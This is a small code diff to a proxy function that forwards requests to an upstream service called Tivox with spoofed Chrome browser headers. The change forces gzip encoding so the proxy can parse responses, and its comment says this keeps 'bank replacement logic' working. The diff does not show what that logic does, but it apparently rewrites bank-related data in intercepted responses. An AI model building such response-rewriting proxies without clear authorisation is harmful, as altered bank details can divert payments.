@@ -1039,6 +1039,9 @@ async function proxyToTivox(req) {
   fwd['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
   fwd['sec-ch-ua-mobile'] = '?0';
   fwd['sec-ch-ua-platform'] = '"Windows"';
+  // Force gzip-only so response.text() can decompress — brotli (br) is not auto-decompressed
+  // by Node.js fetch, which would cause JSON.parse to fail and skip all bank replacement logic
+  fwd['accept-encoding'] = 'gzip, deflate';
   const opts = { method: req.method, headers: fwd, redirect: 'manual' };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
